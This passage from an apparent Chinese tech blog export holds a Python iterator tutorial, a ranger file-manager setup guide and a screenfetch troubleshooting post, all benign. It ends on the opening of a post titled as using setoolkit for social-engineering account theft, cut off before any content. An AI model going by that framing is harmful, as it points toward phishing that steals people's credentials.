<p>代码我指定的是<code>2</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>].__iter__()</span><br><span class="line"></span><br><span class="line">print(a.__setstate__(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br></pre></td></tr></table></figure>
<p>结果他是从第三个开始的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
<h1 id="手写迭代器"><a href="#手写迭代器" class="headerlink" title="手写迭代器"></a>手写迭代器</h1><p><code>__iter__() </code>方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 <strong>next</strong>() 方法并通过 StopIteration 异常标识迭代的完成</p>
<p><code>__next__()</code> 方法（Python 2 里是 next()）会返回下一个迭代器对象</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Iterative_generation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个__iter__类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  self</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个__next__类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        b=self.a</span><br><span class="line">        <span class="comment"># 每调用这个类就加1</span></span><br><span class="line">        self.a+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span>  b</span><br><span class="line"></span><br><span class="line">myclass=Iterative_generation()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用myclass的__iter__方法</span></span><br><span class="line">print(myclass.__iter__())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次调用myclass的__iter__方法</span></span><br><span class="line">print(myclass.__next__())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次调用myclass的__iter__方法</span></span><br><span class="line">print(myclass.__next__())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三次调用myclass的__iter__方法</span></span><br><span class="line">print(myclass.__next__())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;__main__.Iterative_generation object at 0x7f863bfc69a0&gt;</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<h1 id="手写迭代器可以for"><a href="#手写迭代器可以for" class="headerlink" title="手写迭代器可以for"></a>手写迭代器可以for</h1><h2 id="StopIteration"><a href="#StopIteration" class="headerlink" title="StopIteration"></a>StopIteration</h2><p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 <code>__next__() </code>方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代</p>
<p>我们可以用任意可以迭代的测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iter() 函数用来生成迭代器</span></span><br><span class="line">it = iter([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">print(it.__next__())</span><br><span class="line">print(it.__next__())</span><br><span class="line">print(it.__next__())</span><br><span class="line">print(it.__next__())</span><br></pre></td></tr></table></figure>
<p>下面的<strong>iter()</strong> 函数用来生成迭代器</p>
<p>结果，可以看见他报了一个StopIteration错，应为他就只能迭代三次。上面我执行了四次就报了一个StopIteration</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;zss&#x2F;杂东西&#x2F;a2.py&quot;, line 6, in &lt;module&gt;</span><br><span class="line">    print(it.__next__())</span><br><span class="line">StopIteration</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 1</span><br></pre></td></tr></table></figure>
<h2 id="手写迭代器可以for-1"><a href="#手写迭代器可以for-1" class="headerlink" title="手写迭代器可以for"></a>手写迭代器可以for</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Iterative_generation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个__iter__类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  self</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个__next__类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        b=self.a</span><br><span class="line">        <span class="comment"># 每调用这个类就加1</span></span><br><span class="line">        self.a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.a&gt;10就会执行下面的语句</span></span><br><span class="line">        <span class="keyword">if</span> self.a&gt;<span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># StopIteration 异常用于标识迭代的完成</span></span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  b</span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">myclass = Iterative_generation()</span><br><span class="line"></span><br><span class="line"><span class="comment"># iter() 函数用来生成迭代器</span></span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> myiter:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
<p><strong>iter()</strong> 函数用来生成迭代器</p>
<p><strong>raise</strong>关键字用于引发异常，您可以定义要引发的错误类型以及要向用户打印的文本</p>
<p><strong>StopIteration</strong>异常用于标识迭代的完成，防止出现无限循环的情况，在 <strong>next</strong>() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。</p>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>ranger配置和使用</title>
    <url>/2021/06/03/ranger/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>在一个无意中发现了一个终端文件管理器，在没有鼠标的情况下可以进行文件操作，下面是我的总结</strong></p>
<h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/qqqqq.png" alt="qqqqq"></p>
<h1 id="ranger介绍"><a href="#ranger介绍" class="headerlink" title="ranger介绍"></a>ranger介绍</h1><div class="note success simple"><p>他是一个终端文件管理器</p>
</div>

<p>项目地址<a href="https://github.com/ranger/ranger">https://github.com/ranger/ranger</a></p>
<h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>我的系统是kali linux，用的环境是kde</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt install ranger</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>安装好你可以看一下<code>~/.config/ranger</code>配置文件是空的</p>
<p>运行这个命令复制配置文件到主目录:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ranger --copy-config=all</span><br></pre></td></tr></table></figure>
<p>运行上面的命令就会有4个文件</p>
<table>
<thead>
<tr>
<th align="center">主要配置文件</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>commands.py</code></td>
<td align="right">包含以Python编写的各种函数的实现，用于修改<code>ranger&#39;s</code>行为</td>
</tr>
<tr>
<td align="center"><code>rc.conf</code></td>
<td align="right">用于设置各种选项并将按键绑定到功能，就是设置快捷键</td>
</tr>
<tr>
<td align="center"><code>rifle.conf</code></td>
<td align="right">决定使用哪个程序打开哪个文件</td>
</tr>
<tr>
<td align="center"><code>scope.sh</code></td>
<td align="right">是一个shell脚本，用于生成各种文件类型的预览</td>
</tr>
</tbody></table>
<h2 id="添加文件管理器图标"><a href="#添加文件管理器图标" class="headerlink" title="添加文件管理器图标"></a>添加文件管理器图标</h2><p><strong>没有添加</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210128183512899.png" alt="image-20210128183512899"></p>
<p><strong>添加了</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210130193626621.png" alt="image-20210130193626621"></p>
<h3 id="安装图标"><a href="#安装图标" class="headerlink" title="安装图标"></a>安装图标</h3><p>下面两个命令就安装好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;alexanderjeurissen&#x2F;ranger_devicons ~&#x2F;.config&#x2F;ranger&#x2F;plugins&#x2F;ranger_devicons</span><br><span class="line">echo &quot;default_linemode devicons&quot; &gt;&gt; $HOME&#x2F;.config&#x2F;ranger&#x2F;rc.conf</span><br></pre></td></tr></table></figure>
<h3 id="解决乱码"><a href="#解决乱码" class="headerlink" title="解决乱码"></a>解决乱码</h3><p>有乱码安装下面的字体</p>
<p>字体大全地址<a href="https://github.com/ryanoasis/nerd-fonts">https://github.com/ryanoasis/nerd-fonts</a></p>
<p>他有很多字体</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210128190435987.png" alt="image-20210128190435987"></p>
<h2 id="图片预览"><a href="#图片预览" class="headerlink" title="图片预览"></a>图片预览</h2><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210130195422041.png" alt="image-20210130195422041"></p>
<h3 id="w3m图像预览"><a href="#w3m图像预览" class="headerlink" title="w3m图像预览"></a>w3m图像预览</h3><p>安装w3m</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install w3m-img</span><br></pre></td></tr></table></figure>
<p>配置文件修改文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set preview_images false  改成   set preview_images true</span><br></pre></td></tr></table></figure>
<h3 id="ueberzug图像预览"><a href="#ueberzug图像预览" class="headerlink" title="ueberzug图像预览"></a>ueberzug图像预览</h3><p>安装ueberzug</p>
<ul>
<li>安装依赖<ul>
<li><code>sudo apt install libx11-dev</code></li>
<li><code>sudo apt install libxext-dev</code></li>
</ul>
</li>
<li>安装ueberzug<ul>
<li><code>sudo pip3 install ueberzug</code></li>
</ul>
</li>
</ul>
<p>配置文件修改文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set preview_images false  改成   set preview_images true</span><br><span class="line">set preview_images_method w3m  改成 set preview_images_method ueberzug</span><br></pre></td></tr></table></figure>
<h3 id="kitty图像预览"><a href="#kitty图像预览" class="headerlink" title="kitty图像预览"></a>kitty图像预览</h3><p>下载kitty</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install kitty</span><br></pre></td></tr></table></figure>


<p>配置文件修改文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set preview_images false  改成   set preview_images true</span><br><span class="line">set preview_images_method w3m  改成 set preview_images_method kitty</span><br></pre></td></tr></table></figure>
<h2 id="视频预览"><a href="#视频预览" class="headerlink" title="视频预览"></a>视频预览</h2><p>在<code>~/.config/ranger</code>这个文件里面的<br>下面这一段给去掉注释</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210402092706190.png" alt="image-20210402092706190"></p>
<p>然后在下载这个文件<code>ffmpegthumbnailer</code>命令<code>sudo apt install ffmpegthumbnailer</code></p>
<h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210402092749702.png" alt="image-20210402092749702"></p>
<h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><p>默认他已经配置好了我们只需要下载一个<code>sudo apt install highlight</code><br>下载前</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210402094849021.png" alt="image-20210402094849021"></p>
<p>下载后的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210402094557528.png" alt="image-20210402094557528"></p>
<h2 id="压缩包预览"><a href="#压缩包预览" class="headerlink" title="压缩包预览"></a>压缩包预览</h2><p>默认他也是经配置好的我们只需要下载一个<code>sudo apt install atool</code></p>
<h2 id="vim打开"><a href="#vim打开" class="headerlink" title="vim打开"></a>vim打开</h2><p>头一次打开文件用Ranger打开文件会让你选择编辑器、</p>
<p>这个我选择的是<strong>2</strong></p>
<p>vim.basic是完整版的vim</p>
<p>vim.tiny是缩简版的vim</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210128182805966.png" alt="image-20210128182805966"></p>
<h2 id="预览文件"><a href="#预览文件" class="headerlink" title="预览文件"></a>预览文件</h2><p>他默认是打开的</p>
<p>在文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<p>里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set preview_files true #默认打开的</span><br></pre></td></tr></table></figure>
<h3 id="效果-2"><a href="#效果-2" class="headerlink" title="效果"></a>效果</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210130201231164.png" alt="image-20210130201231164"></p>
<p>启动安装<code>z</code>,<code>p</code>键</p>
<h2 id="启动栏绘制边框"><a href="#启动栏绘制边框" class="headerlink" title="启动栏绘制边框"></a>启动栏绘制边框</h2><p>在文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<p>设置成下面这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set draw_borders  true</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/2021-02-03_17-14.png" alt="2021-02-03_17-14"></p>
<h2 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a>显示行号</h2><p>在文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<p>设置成下面这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set line_numbers  true</span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/2021-02-03_17-20.png" alt="2021-02-03_17-20"></p>
<h2 id="设置宽度"><a href="#设置宽度" class="headerlink" title="设置宽度"></a>设置宽度</h2><p>在文件在<code>vi ~/.config/ranger/rc.conf </code></p>
<p>设置成下面这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set column_ratios  2,3,5</span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/2021-02-03_17-26.png" alt="2021-02-03_17-26"></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="文件管理器操作"><a href="#文件管理器操作" class="headerlink" title="文件管理器操作"></a>文件管理器操作</h2><table>
<thead>
<tr>
<th align="center">文件管理器操作</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>h</code></td>
<td align="right">返回上一层</td>
</tr>
<tr>
<td align="center"><code>l</code></td>
<td align="right">进入文件</td>
</tr>
<tr>
<td align="center"><code>j</code></td>
<td align="right">向下</td>
</tr>
<tr>
<td align="center"><code>k</code></td>
<td align="right">向上</td>
</tr>
<tr>
<td align="center"><code>Enter</code></td>
<td align="right">打开文件</td>
</tr>
<tr>
<td align="center"><code>q</code></td>
<td align="right">退出</td>
</tr>
</tbody></table>
<h2 id="获得帮助"><a href="#获得帮助" class="headerlink" title="获得帮助"></a>获得帮助</h2><p>您可以在使用Ranger时获得帮助</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>m</code></td>
<td align="right">打开护林员的手册页</td>
</tr>
<tr>
<td align="center"><code>k</code></td>
<td align="right">打开键绑定列表</td>
</tr>
<tr>
<td align="center"><code>c</code></td>
<td align="right">打开可用命令和描述的列表</td>
</tr>
<tr>
<td align="center"><code>s</code></td>
<td align="right">打开设置及其当前值的列表                              |</td>
</tr>
</tbody></table>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>dD</code> 或者 <code>F8</code></td>
<td align="left">删除条目（文件或者文件夹），或者 <code>:</code> + <code>delete</code>。</td>
</tr>
<tr>
<td align="left"><code>DD</code></td>
<td align="left">将条目移动到回收站里。</td>
</tr>
</tbody></table>
<h2 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>F7</code></td>
<td align="left">新建文件夹，等同于 <code>:mkdir </code>。</td>
</tr>
<tr>
<td align="left"><code>INSERT</code></td>
<td align="left">新建文件，等同于 <code>:touch </code>。</td>
</tr>
</tbody></table>
<h2 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>cw</code></td>
<td align="left">重命名（含后缀名）</td>
</tr>
<tr>
<td align="left"><code>I</code></td>
<td align="left">重命名，光标在最前</td>
</tr>
<tr>
<td align="left"><code>A</code></td>
<td align="left">重命名，光标在最后（含后缀名）</td>
</tr>
<tr>
<td align="left"><code>a</code></td>
<td align="left">重命名，光标在最后（不含后缀名）</td>
</tr>
</tbody></table>
<h2 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>yy</code> 或者 <code>F5</code></td>
<td align="left">复制</td>
</tr>
<tr>
<td align="left"><code>ya</code></td>
<td align="left"><code>add</code> 模式，添加光标处文件到复制队列中（文件夹无效）。</td>
</tr>
<tr>
<td align="left"><code>yr</code></td>
<td align="left"><code>remove</code> 模式，从复制队列中移除光标处文件（文件夹无效）。</td>
</tr>
<tr>
<td align="left"><code>yt</code></td>
<td align="left"><code>toggle</code> 模式，切换光标处文件是否在复制队列中（文件夹无效）。</td>
</tr>
<tr>
<td align="left"><code>yk</code></td>
<td align="left">将光标处文件和上一文件添加到复制队列中（文件夹无效）。</td>
</tr>
<tr>
<td align="left"><code>yj</code></td>
<td align="left">将光标处文件和下一文件添加到复制队列中（文件夹无效）。</td>
</tr>
<tr>
<td align="left"><code>ygg</code></td>
<td align="left">将光标处到顶端的所有文件添加到复制队列中（文件夹无效）</td>
</tr>
<tr>
<td align="left"><code>yG</code></td>
<td align="left">将光标处到底端的所有文件添加到复制队列中（文件夹无效）</td>
</tr>
</tbody></table>
<h2 id="剪切"><a href="#剪切" class="headerlink" title="剪切"></a>剪切</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>dd</code> 或者 <code>F6</code></td>
<td align="left">剪切</td>
</tr>
<tr>
<td align="left"><code>da</code></td>
<td align="left"><code>add</code> 模式，同复制。</td>
</tr>
<tr>
<td align="left"><code>dr</code></td>
<td align="left"><code>remove</code> 模式，同复制。</td>
</tr>
<tr>
<td align="left"><code>dt</code></td>
<td align="left"><code>toggle</code> 模式，同复制。</td>
</tr>
<tr>
<td align="left"><code>dk</code></td>
<td align="left">同复制</td>
</tr>
<tr>
<td align="left"><code>dj</code></td>
<td align="left">同复制</td>
</tr>
<tr>
<td align="left"><code>dgg</code></td>
<td align="left">同复制</td>
</tr>
<tr>
<td align="left"><code>dG</code></td>
<td align="left">同复制</td>
</tr>
<tr>
<td align="left"><code>ud</code> 或者 <code>uy</code></td>
<td align="left">取消剪切</td>
</tr>
</tbody></table>
<h2 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>pp</code></td>
<td align="left">粘贴，默认 <code>append</code> 模式</td>
</tr>
<tr>
<td align="left"><code>pP</code></td>
<td align="left"><code>append</code> 模式，如果该目录中有同名条目，则在条目后面加上 <code>_</code>、<code>_0</code>、<code>_1</code>……。如果条目是文件，则在文件后缀名后加入。</td>
</tr>
<tr>
<td align="left"><code>po</code></td>
<td align="left"><code>overwrite</code> 模式，如果该目录中有同名条目，则覆盖原来的条目。</td>
</tr>
<tr>
<td align="left"><code>pO</code></td>
<td align="left"><code>append</code> 模式 + <code>overwrite</code> 模式。</td>
</tr>
<tr>
<td align="left"><code>pl</code></td>
<td align="left">粘贴为符号链接，不在状态栏显示目标条目的相对路径。</td>
</tr>
<tr>
<td align="left"><code>pL</code></td>
<td align="left">粘贴为符号链接（相对路径），在状态栏显示目标条目的相对路径。</td>
</tr>
<tr>
<td align="left"><code>phl</code></td>
<td align="left">粘贴为硬链接</td>
</tr>
<tr>
<td align="left"><code>pht</code></td>
<td align="left">粘贴为硬链接的子目录（hardlinked subtree）</td>
</tr>
</tbody></table>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>/</code></td>
<td align="left">打开搜索框，输入要搜索的字符串，回车后开始搜索。</td>
</tr>
<tr>
<td align="left"><code>f</code></td>
<td align="left">查找，等同于运行满足条件的文件或者打开满足条件的文件夹。</td>
</tr>
<tr>
<td align="left"><code>zf</code></td>
<td align="left">与命令行 <code>filter</code> 作用一样，只显示符合条件的条目，区分大小写。</td>
</tr>
<tr>
<td align="left"><code>n</code> <code>N</code></td>
<td align="left">查找下一个搜索结果 查找上一个搜索结果</td>
</tr>
<tr>
<td align="left"><code>c</code> + <code>对应字母</code></td>
<td align="left">通过对应属性依次遍历，如：<code>ca</code>：通过 <code>atime</code>属性依次遍历<code>cc</code>：通过 <code>ctime</code> 属性依次遍历<code>ci</code>：通过 <code>mimetype</code> 属性依次遍历<code>cm</code>：通过 <code>mtime</code> 属性依次遍历<code>cs</code>：通过 <code>size</code> 属性依次遍历<code>ct</code>：通过 <code>tag</code> 属性依次遍历</td>
</tr>
</tbody></table>
<p>这个超级详细<a href="http://www.huangpan.net/posts/ji-ke/2019-08-21-ranger.html#toc-heading-1">http://www.huangpan.net/posts/ji-ke/2019-08-21-ranger.html#toc-heading-1</a></p>
]]></content>
      <categories>
        <category>好软件使用</category>
      </categories>
      <tags>
        <tag>好软件使用</tag>
      </tags>
  </entry>
  <entry>
    <title>screenfetch脚本工具卡住问题解决</title>
    <url>/2021/09/08/screenfetch/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note warning simple"><p>问题解决</p>
</div>



<div class="note warning simple"><p>screenfetch这个是一个显示硬件配置的一个算是一个工具或者说是一个脚本的</p>
<p>作者发布的开源地址<a href="https://github.com/KittyKatt/screenFetch">https://github.com/KittyKatt/screenFetch</a></p>
</div>



<p><strong>我运行这个命令的时候他一直卡在这个地方等几分钟才运行</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210901111811515.png" alt="image-20210901111811515"></p>
<div class="note info simple"><p>重新安装不行，还是老样子</p>
<p>我只能从根部找问题肯定先找到他的启动路径用<code>find / -name &quot;*screenfetch*&quot;</code>全盘搜索他的文件</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210901112558281.png" alt="image-20210901112558281"></p>
<div class="note info simple"><p>查看他的源代码，发现他是文件内容，他有60000多行代码我要是一个一个分析那不累死</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210901112628954.png" alt="image-20210901112628954"></p>
<div class="note info simple"><p>能看出来他是shell代码</p>
<p>可以用<code>-x</code>来调试看看</p>
</div>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -x /usr/bin/screenfetch </span><br></pre></td></tr></table></figure>
<p>发现他卡在</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904150149693.png" alt="image-20210904150149693"></p>
<div class="note info simple"><p> Snap是一个仓库</p>
<p>我单独拿出来运行一下</p>
<p><code>snap list </code>命令查询已经安装了的软件</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snap list</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>他果然卡这个地方那，那应该就是这个问题导致的加载不出</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904150325265.png" alt="image-20210904150325265"></p>
<p>等了一会他报这个错误</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904150531235.png" alt="image-20210904150531235"></p>
<p>然后我百度了一下，可以看见他说重启一下<code>snap</code>服务就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart snapd.service</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904150611257.png" alt="image-20210904150611257"></p>
<div class="note info simple"><p>启动是没有卡，但是发现他有一个报错，说是在<code>/usr/bin/screenfetch</code>里面的<code>1851</code>行</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904183005562.png" alt="image-20210904183005562"></p>
<p>他说是在下面这个文件的地方</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904183140883.png" alt="image-20210904183140883"></p>
<p>百度根本不行，我决定自己分析一下</p>
<p><code>free</code>命令是查看内存的详细用的，没有看见下面这个的确是没有内存信息显示的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904184517748.png" alt="image-20210904184517748"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904184605813.png" alt="image-20210904184605813"></p>
<div class="note info simple"><p>awk是分享处理过滤结果用的，:是指定切分的地方，NR=2是在第二行，输出第二个</p>
<p>我发现这个命令没有毛病啊怎么会错那，怎么会不显示那</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904184824100.png" alt="image-20210904184824100"></p>
<div class="note info simple"><p>我发现这个<code>：</code>和上面这个<code>:</code>有不同一个是中文一个是英文</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904185009345.png" alt="image-20210904185009345"></p>
<p>我把他改成中文的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904185126971.png" alt="image-20210904185126971"></p>
<p><strong>问题完美解决</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20210904185247670.png" alt="image-20210904185247670"></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>setoolkit社工盗号</title>
    <url>/2021/04/10/setoolkit/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>setoolkit工具使用总结</p>
